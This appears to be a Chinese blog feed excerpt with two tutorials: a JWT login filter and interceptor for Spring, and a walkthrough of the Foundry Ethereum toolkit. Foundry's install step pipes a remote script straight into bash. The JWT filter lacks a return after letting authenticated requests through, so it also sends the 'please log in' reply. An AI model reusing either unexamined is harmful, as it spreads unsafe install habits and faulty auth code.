class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取本次请求的URI</span></span><br><span class="line">        String requestURI = request.getRequestURI();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;拦截到的请求：&#123;&#125;&quot;</span>,requestURI);</span><br><span class="line"></span><br><span class="line">        String[] urls = <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                <span class="string">&quot;/jwtLogin/**&quot;</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.判断本次请求是否需要处理</span></span><br><span class="line">        <span class="keyword">boolean</span> check = check(urls,requestURI);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.如果不需要处理，则直接放行</span></span><br><span class="line">        <span class="keyword">if</span>(check)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;本次请求不需要处理：&#123;&#125;&quot;</span>,requestURI);</span><br><span class="line">            filterChain.doFilter(request,response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从请求头中获取token字符串并解析</span></span><br><span class="line">        Claims claims = JwtUtil.parse(request.getHeader(<span class="string">&quot;Authorization&quot;</span>));</span><br><span class="line">        <span class="comment">// 已登录就直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (claims != <span class="keyword">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应数据类型为json（前后端分离）</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        <span class="comment">// 设置响应内容，结束请求</span></span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 路径匹配，检查本次请求是否需要方放行</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> requestURI</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> urls</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String[] urls, String requestURI)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String url : urls)&#123;</span><br><span class="line">            <span class="keyword">boolean</span> match = PATH_PATTERN.match(url,requestURI);</span><br><span class="line">            <span class="keyword">if</span>(match)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重启服务器使拦截器生效：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204201125311.png" alt="image-20230204201125311"></p><h4 id="上下文对象-1"><a href="#上下文对象-1" class="headerlink" title="上下文对象"></a>上下文对象</h4><p><code>JWT</code>无法把用户信息直接存储起来，所以<code>JWT</code>的上下文对象要靠我们自己来实现。</p><p>首先需要定义一个上下文类，这个类专门存储<code>JWT</code>解析出来的用户信息，需要用到<code>ThreadLocal</code>,以防止线程冲突。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserContext</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;String&gt; user = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        user.set(userName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        user.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 当前登录用户的用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getCurrentUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改一下拦截器：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 简单的白名单，登录这个接口直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;/jwtLogin&quot;</span>.equals(request.getRequestURI())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从请求头中获取token字符串并解析</span></span><br><span class="line">        Claims claims = JwtUtil.parse(request.getHeader(<span class="string">&quot;Authorization&quot;</span>));</span><br><span class="line">        <span class="comment">// 已登录就直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (claims != <span class="keyword">null</span>) &#123;</span><br><span class="line">            UserContext.add(claims.getSubject());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 走到这里就代表是其他接口，且没有登录</span></span><br><span class="line">        <span class="comment">// 设置响应数据类型为json（前后端分离）</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        <span class="comment">// 设置响应内容，结束请求</span></span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>SpringBoot</code>启动类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtApplication</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(JwtApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使拦截器生效</span></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> LoginInterceptor());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一个上下文对象就做好了，用法和之前一样，可以在程序的其他地方直接获取到数据，我们在Service层中来使用它：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204204329834.png" alt="image-20230204204329834"></p><h3 id="session-与-JWT-的优劣"><a href="#session-与-JWT-的优劣" class="headerlink" title="session 与 JWT 的优劣"></a>session 与 JWT 的优劣</h3><p><strong>优点：</strong></p><ul><li><p>session</p><ol><li>开箱即用，简单方便</li><li>可以有效管理用户登录的状态，如续期，销毁等</li></ol></li><li><p>JWT</p><ol><li>可以直接解析数据，服务端不用存储数据</li><li>有利于水平扩展，如多个系统可以使用同一个 Token 进行登录</li></ol></li></ul><p><strong>缺点：</strong></p><ul><li><p>session</p><p>需要额外存储数据</p></li><li><p>JWT</p><ol><li><code>JWT</code>签名的长度远比一个 <code>Session Id</code>长很多，增加额外网络开销</li><li>无法销毁、续期登录状态</li><li>密钥一旦被泄漏，攻击者就可以伪造 Token</li></ol></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>JWT</code>根据<code>secretKey</code>会生成一个独特的字符串，别人没有这个秘钥的话是无法伪造或篡改<code>JWT</code>的，另外<code>JWT</code>不能存放密码等敏感信息，因为<code>JWT</code>只能防止被篡改，不能防止别人解密你这个字符串。</p><p>例如通过<a href="https://jwt.io/%E8%A7%A3%E5%AF%86%60JWT%60%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A">https://jwt.io/解密`JWT`字符串：</a></p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204205322774.png" alt="image-20230204205322774"></p><p>文章中的代码放在：<a href="https://github.com/Banannna69/JavaAuthorization">https://github.com/Banannna69/JavaAuthorization</a></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/EZEh_d4DtKme-xBuKEpK8w">【在用安全框架前，我想先让你手撸一个登陆认证】</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;登录认证，估计是所有系统中最常见的功能了，并且也是最基础、最重要的功能。为了做好这一块而诞生了许多安全框架，比如最常见的Shiro、Spri</summary>
      
    
    
    
    
    <category term="Java" scheme="https://banana69.site/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Foundry 框架使用</title>
    <link href="https://banana69.site/2023/02/03/Foundry/"/>
    <id>https://banana69.site/2023/02/03/Foundry/</id>
    <published>2023-02-03T14:12:01.000Z</published>
    <updated>2023-02-04T14:03:25.476Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Foundry-介绍"><a href="#Foundry-介绍" class="headerlink" title="Foundry 介绍"></a>Foundry 介绍</h3><p>Foundry是 一个用 Rust编写的用于以太坊应用程序开发的极快、可移植和模块化的工具包 ( Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.)</p><p> Foundry 作为 以太坊（Solidity语言）项目/应用程序开发的 “工程化” 工具，提供专业 Solidity 开发环境与“工具链”。<strong>通过它你可以快速、方便的完成依赖项管理、编译、运行测试、部署，并可以通过命令行和 Solidity 脚本与链进行交互</strong>，其利用 <a href="https://github.com/gakonst/ethers-rs/tree/master/ethers-solc/">ethers-solc</a> 比较于传统通过 Node.js 辅助完成的测试用例/工程，Foundry 构建、测试的执行速度很快。</p><h3 id="Foundry-组成"><a href="#Foundry-组成" class="headerlink" title="Foundry 组成"></a>Foundry 组成</h3><p>Foundry 项目由 <code>Forge</code>, <code>Cast</code>, <code>Anvil</code> 几个部分（命令行工具）组成</p><ul><li>Forge: Foundry 项目中<strong>执行初始化项目、管理依赖、测试、构建、部署智能合约</strong>的命令行工具;</li><li>Cast: Foundry 项目中<strong>与 RPC 节点交互</strong>的命令行工具。可以进行智能合约的调用、发送交易数据或检索任何类型的链上数据;</li><li>Anvil: Foundry 项目中<strong>启动的本地测试网/节点</strong>的命令行工具。可以使用它配合测试前端应用与部署在该测试网的合约或通过 RPC 进行交互;</li></ul><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><p>通过脚本安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L https://foundry.paradigm.xyz | bash</span><br><span class="line">foundryup</span><br></pre></td></tr></table></figure><p>初始化Foundry项目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge init hello</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202161110084.png" alt="image-20230202161110084"></p><p>目录结构：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tree -L 2 </span><br><span class="line">.</span><br><span class="line">├── foundry.toml        # Foundry 的 package 配置文件</span><br><span class="line">├── lib                 # Foundry 的依赖库</span><br><span class="line">│   └── forge-std       # 工具 forge 的基础依赖</span><br><span class="line">├── script              # Foundry 的脚本</span><br><span class="line">│   └── Counter.s.sol   # 示例合约 Counter 的脚本</span><br><span class="line">├── src                 # 智能合约的业务逻辑、源代码将会放在这里</span><br><span class="line">│   └── Counter.sol     # 示例合约</span><br><span class="line">└── test                # 测试用例目录</span><br><span class="line">    └── Counter.t.sol   # 示例合约的测试用例</span><br></pre></td></tr></table></figure><ul><li><p>src 目录</p><p>存放合约文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    //设置变量内容</span><br><span class="line">    function setNumber(uint256 newNumber) public &#123;</span><br><span class="line">        number = newNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //number自增</span><br><span class="line">    function increment() public &#123;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>script 目录</p><p>该目录主要由“部署”脚本构成（也可通过该脚本调用 Foundry 提供的 <code>vm</code> 功能实现应用业务逻辑之外的高级功能，等同于 Hardhat.js 中的 scripts）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterScript is Script &#123;</span><br><span class="line">    //可选函数，在每个函数运行之前被调用</span><br><span class="line">    function setUp() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">    //部署时会调用run函数</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast(); // 开始部署</span><br><span class="line">        new Counter(); // 创建合约</span><br><span class="line">        vm.stopBroadcast(); // 结束部署</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Foundry的部署脚本是一个用Solidity写的智能合约，虽然它不会被部署，但符合Solidity的规范。你可以用<code>forge script</code>运行脚本并部署合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script script/Counter.s.sol:CounterScript</span><br></pre></td></tr></table></figure></li><li><p>test 目录</p><p>test 目录主要存放合约的测试用例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;; // 引入 forge-std 中用于测试的依赖</span><br><span class="line">import &quot;../src/Counter.sol&quot;; // 引入用于测试的业务合约</span><br><span class="line"></span><br><span class="line">contract CounterTest is Test &#123;</span><br><span class="line">    Counter public counter;</span><br><span class="line"></span><br><span class="line">    // 初始化测试用例</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        counter = new Counter();</span><br><span class="line">        counter.setNumber(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 基于初始化测试用例</span><br><span class="line">    // 断言测试自增后的 counter 的 number 返回值 同等于 1</span><br><span class="line">    function testIncrement() public &#123;</span><br><span class="line">        counter.increment();</span><br><span class="line">        assertEq(counter.number(), 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 基于初始化测试用例</span><br><span class="line">    // 执行差异测试</span><br><span class="line">    // forge 测试的过程中</span><br><span class="line">    // 为 testSetNumber 函数参数传递不同的 unit256 类型的 x</span><br><span class="line">    // 达到测试 counter 的 setNumber 函数 为不同的 x 设置不同的数</span><br><span class="line">    // 断言 number() 的返回值等同于差异测试的 x 参数</span><br><span class="line">    function testSetNumber(uint256 x) public &#123;</span><br><span class="line">        counter.setNumber(x);</span><br><span class="line">        assertEq(counter.number(), x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构建执行&amp;测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge build</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162153359.png" alt="image-20230202162153359"></p><p>完成构建后 通过 <code>forge test</code> 完成测试</p><p><img src="/image/Foundry.assets/image-20230202162210346.png" alt="image-20230202162210346"></p></li></ul><h3 id="Foundry-Cast的使用"><a href="#Foundry-Cast的使用" class="headerlink" title="Foundry Cast的使用"></a>Foundry Cast的使用</h3><h5 id="查询区块："><a href="#查询区块：" class="headerlink" title="查询区块："></a>查询区块：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># $PRC_MAIN 替换成需要的RPC地址</span><br><span class="line">cast block-number --rpc-url=$RPC_MAIN</span><br><span class="line"># 可以设置环境变量的ETH_PRC_URL</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162352898.png" alt="image-20230202162352898"></p><h5 id="查询区块信息"><a href="#查询区块信息" class="headerlink" title="查询区块信息"></a>查询区块信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast block 31 --rpc-url=http://127.0.0.1:7545</span><br><span class="line">//格式化输出 block 31  --json --rpc-url=http://127.0.0.1:7545</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162623074.png" alt="image-20230202162623074"></p><h5 id="查询交易"><a href="#查询交易" class="headerlink" title="查询交易"></a>查询交易</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 跟ethersjs中的 provider.getTransaction 类似</span><br><span class="line">cast tx &lt;HASH&gt; [FIELD] --rpc-url=$RPC</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blockHash            0xad0e662c227391bc44cf7308c3a600d00f6964a88f16804710b37620183de84f</span><br><span class="line">blockNumber          31</span><br><span class="line">from                 0x6DFCab7cfD1BA8915c4256eaaA4A494Ca8062C18</span><br><span class="line">gas                  881868</span><br><span class="line">gasPrice             20000000000</span><br><span class="line">hash                 0x63b8b5f61940e9e63b4b02835342e5794f522df0b0b62bff6e8a554ca7766a11</span><br><span class="line">input                0x60806040526012600560006101000a81548160ff021916908360ff1602179055503480156200002d57600080fd5b5060405162001166380380620011668339818101604052810190620000539190620001bb565b81600390805190602001906200006b9291906200008d565b508060049080519060200190620000849291906200008d565b505050620003c4565b8280546200009b90620002d5565b90600052602060002090601f016020900481019282620000bf57600085556200010b565b82601f10620000da57805160ff19168380011785556200010b565b828001600101855582156200010b579182015b828111156200010a578251825591602001919060010190620000ed565b5b5090506200011a91906200011e565b5090565b5b80821115620001395760008160009055506001016200011f565b5090565b6000620001546200014e8462000269565b62000240565b905082815260208101848484011115620001735762000172620003a4565b5b620001808482856200029f565b509392505050565b600082601f830112620001a0576200019f6200039f565b5b8151620001b28482602086016200013d565b91505092915050565b60008060408385031215620001d557620001d4620003ae565b5b600083015167ffffffffffffffff811115620001f657620001f5620003a9565b5b620002048582860162000188565b925050602083015167ffffffffffffffff811115620002285762000227620003a9565b5b620002368582860162000188565b9150509250929050565b60006200024c6200025f565b90506200025a82826200030b565b919050565b6000604051905090565b600067ffffffffffffffff82111562000287576200028662000370565b5b6200029282620003b3565b9050602081019050919050565b60005b83811015620002bf578082015181840152602081019050620002a2565b83811115620002cf576000848401525b50505050565b60006002820490506001821680620002ee57607f821691505b6020821081141562000305576200030462000341565b5b50919050565b6200031682620003b3565b810181811067ffffffffffffffff8211171562000338576200033762000370565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b610d9280620003d46000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c806342966c681161007157806342966c681461016857806370a082311461018457806395d89b41146101b4578063a0712d68146101d2578063a9059cbb146101ee578063dd62ed3e1461021e576100a9565b806306fdde03146100ae578063095ea7b3146100cc57806318160ddd146100fc57806323b872dd1461011a578063313ce5671461014a575b600080fd5b6100b661024e565b6040516100c39190610b02565b60405180910390f35b6100e660048036038101906100e19190610a14565b6102dc565b6040516100f39190610ae7565b60405180910390f35b6101046103ce565b6040516101119190610b24565b60405180910390f35b610134600480360381019061012f91906109c1565b6103d4565b6040516101419190610ae7565b60405180910390f35b610152610583565b60405161015f9190610b3f565b60405180910390f35b610182600480360381019061017d9190610a54565b610596565b005b61019e60048036038101906101999190610954565b61066d565b6040516101ab9190610b24565b60405180910390f35b6101bc610685565b6040516101c99190610b02565b60405180910390f35b6101ec60048036038101906101e79190610a54565b610713565b005b61020860048036038101906102039190610a14565b6107ea565b6040516102159190610ae7565b60405180910390f35b61023860048036038101906102339190610981565b610905565b6040516102459190610b24565b60405180910390f35b6003805461025b90610c88565b80601f016020809104026020016040519081016040528092919081815260200182805461028790610c88565b80156102d45780601f106102a9576101008083540402835291602001916102d4565b820191906000526020600020905b8154815290600101906020018083116102b757829003601f168201915b505050505081565b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040516103bc9190610b24565b60405180910390a36001905092915050565b60025481565b600081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546104629190610bcc565b92505081905550816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546104b79190610bcc565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461050c9190610b76565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516105709190610b24565b60405180910390a3600190509392505050565b600560009054906101000a900460ff1681565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546105e49190610bcc565b9250508190555080600260008282546105fd9190610bcc565b92505081905550600073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516106629190610b24565b60405180910390a350565b60006020528060005260406000206000915090505481565b6004805461069290610c88565b80601f01602080910402602001604051908101604052809291908181526020018280546106be90610c88565b801561070b5780601f106106e05761010080835404028352916020019161070b565b820191906000526020600020905b8154815290600101906020018083116106ee57829003601f168201915b505050505081565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546107619190610b76565b92505081905550806002600082825461077a9190610b76565b925050819055503373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516107df9190610b24565b60405180910390a350565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461083a9190610bcc565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461088f9190610b76565b925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516108f39190610b24565b60405180910390a36001905092915050565b6001602052816000526040600020602052806000526040600020600091509150505481565b60008135905061093981610d2e565b92915050565b60008135905061094e81610d45565b92915050565b60006020828403121561096a57610969610d18565b5b60006109788482850161092a565b91505092915050565b6000806040838503121561099857610997610d18565b5b60006109a68582860161092a565b92505060206109b78582860161092a565b9150509250929050565b6000806000606084860312156109da576109d9610d18565b5b60006109e88682870161092a565b93505060206109f98682870161092a565b9250506040610a0a8682870161093f565b9150509250925092565b60008060408385031215610a2b57610a2a610d18565b5b6000610a398582860161092a565b9250506020610a4a8582860161093f565b9150509250929050565b600060208284031215610a6a57610a69610d18565b5b6000610a788482850161093f565b91505092915050565b610a8a81610c12565b82525050565b6000610a9b82610b5a565b610aa58185610b65565b9350610ab5818560208601610c55565b610abe81610d1d565b840191505092915050565b610ad281610c3e565b82525050565b610ae181610c48565b82525050565b6000602082019050610afc6000830184610a81565b92915050565b60006020820190508181036000830152610b1c8184610a90565b905092915050565b6000602082019050610b396000830184610ac9565b92915050565b6000602082019050610b546000830184610ad8565b92915050565b600081519050919050565b600082825260208201905092915050565b6000610b8182610c3e565b9150610b8c83610c3e565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610bc157610bc0610cba565b5b828201905092915050565b6000610bd782610c3e565b9150610be283610c3e565b925082821015610bf557610bf4610cba565b5b828203905092915050565b6000610c0b82610c1e565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b60005b83811015610c73578082015181840152602081019050610c58565b83811115610c82576000848401525b50505050565b60006002820490506001821680610ca057607f821691505b60208210811415610cb457610cb3610ce9565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600080fd5b6000601f19601f8301169050919050565b610d3781610c00565b8114610d4257600080fd5b50565b610d4e81610c3e565b8114610d5957600080fd5b5056fea2646970667358221220430240f2b33f93c884b94998ebe80de680b44967c2812f7cc349d7fb925e3c5264736f6c6343000807003300000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a434845434b4552433230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005434845434b000000000000000000000000000000000000000000000000000000</span><br><span class="line">nonce                30</span><br><span class="line">r                    0xd32cfba9d9ecb3441761ae9b8d4670c5e18abc7aae3a6e7a09db6b2e45fb4c54</span><br><span class="line">s                    0x5688918c3fa834d2ec4fa24ff269a573f80a5dd25cb55fdb3d70f38ddede9101</span><br><span class="line">to</span><br><span class="line">transactionIndex     0</span><br><span class="line">v                    37</span><br><span class="line">value                0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 跟ethersjs中的 provider.getTransactionReceipt类似</span><br><span class="line">cast receipt &lt;HASH&gt; [FIELD] --rpc-url=$RPC</span><br><span class="line"></span><br><span class="line">#只获得 logs</span><br><span class="line">cast receipt &lt;HASH&gt; logs --rpc-url=$RPC</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163000901.png" alt="image-20230202163000901"></p><h5 id="获取交易方法"><a href="#获取交易方法" class="headerlink" title="获取交易方法"></a>获取交易方法</h5><p>Cast 会从 <a href="https://sig.eth.samczsun.com./">Ethereum Signature Database</a> 解析对应的方法名称</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast 4byte &lt;SELECTOR&gt; 解析交易的名称</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163126740.png" alt="image-20230202163126740"></p><h5 id="交易签名"><a href="#交易签名" class="headerlink" title="交易签名"></a>交易签名</h5><p>使用 Keccak-256 能够计算出方法名，函数名为被调函数的Keccak-256哈希值的前4个字节。这允许EVM准确无误地识别被调函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast sig &lt;SIG&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163242425.png" alt="image-20230202163242425"></p><p>交易解码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获得calldata</span><br><span class="line">cast tx 0xc0dd067932ced612c7833ba739c66ad573e76c4909c29be1b3bf7a3d9e0308a0 